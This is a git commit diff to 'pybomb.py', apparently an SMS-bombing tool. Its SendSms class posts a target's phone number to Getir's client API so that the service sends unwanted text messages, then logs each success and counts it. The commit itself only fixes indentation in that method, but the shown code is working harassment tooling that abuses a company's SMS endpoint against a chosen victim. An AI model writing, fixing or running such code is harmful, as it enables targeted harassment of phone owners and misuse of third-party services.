e88705f01f219427392e109963b3a58d4b092131
Tnixss <147255034+Tnixss@users.noreply.github.com>
2023-10-07 17:00:03 +0300

    Update pybomb.py

--- pybomb.py
+++ pybomb.py
@@ -261,9 +261,9 @@ class SendSms():
     def getir(self):
         try:
             wmf = requests.post("https://food-client-api-gateway.getirapi.com/clients/by-gsm/?countryCode=90&gsm=" + self.phone
-        if wmf.status_code == 202:
-            print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> getir.com")
-            self.adet += 1
+            if wmf.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> getir.com")
+                self.adet += 1
             else: 
                 raise
         except:
